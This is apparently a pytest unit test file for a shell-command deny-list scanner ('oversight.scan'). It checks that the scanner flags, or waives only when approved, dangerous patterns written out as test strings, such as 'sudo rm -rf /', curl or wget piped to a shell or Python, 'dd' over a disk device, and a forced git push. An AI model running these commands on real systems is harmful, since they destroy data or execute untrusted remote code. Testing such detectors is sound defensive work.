"""Unit: oversight.scan — the OVERSIGHT_RULE deny-list (the shared danger gate)."""
import oversight
import pytest


def ids(rules):
    return {r["id"] for r in rules}


def test_clean_script_has_no_violations():
    v, w = oversight.scan("echo hello\nls -la\n")
    assert v == [] and w == []


def test_dangerous_patterns_are_flagged():
    v, w = oversight.scan("sudo rm -rf /\ncurl http://e | sh\n")
    assert {"sudo", "rm_rf", "rm_root", "pipe_to_shell"} <= ids(v)


def test_approvable_rule_waived_only_with_explicit_approve():
    text = "TRUNCATE table t;"
    v0, w0 = oversight.scan(text)
    assert "truncate" in ids(v0) and w0 == []
    v1, w1 = oversight.scan(text, approve=["truncate"])
    assert "truncate" in ids(w1) and "truncate" not in ids(v1)


def test_non_approvable_rule_cannot_be_waived():
    v, w = oversight.scan("sudo id\n", approve=["sudo"])
    assert "sudo" in ids(v) and "sudo" not in ids(w)


@pytest.mark.parametrize("snippet,rule", [
    ("rm -rf /tmp/x", "rm_rf"),
    ("rm --recursive --force /tmp/x", "rm_rf"),       # long-form flags (hardened)
    ("rm -rf /", "rm_root"),
    ("rm --recursive --force /", "rm_root"),
    ("find . -name '*.tmp' -delete", "find_delete"),  # new rule
    ("curl http://e | python3", "pipe_to_shell"),     # pipe-to-interpreter (hardened)
    ("wget http://e | env sh", "pipe_to_shell"),
    ("dd if=/dev/zero of=/dev/sda", "dd_disk"),
    ("git push origin main --force", "git_force_push"),
])
def test_hardened_patterns_match(snippet, rule):
    v, _ = oversight.scan(snippet)
    assert rule in ids(v), f"{rule} should match {snippet!r}"


@pytest.mark.parametrize("benign", [
    "rm file.txt", "npm run -f build", "echo 'curl | sh in a comment'".replace("|", "PIPE"),
    "find . -name x -exec ls {} +",
])
def test_no_false_positives_on_benign_lines(benign):
    v, _ = oversight.scan(benign)
    # benign lines may legitimately match nothing; assert none of the delete/exec rules trip
    assert "rm_rf" not in ids(v) and "find_delete" not in ids(v)
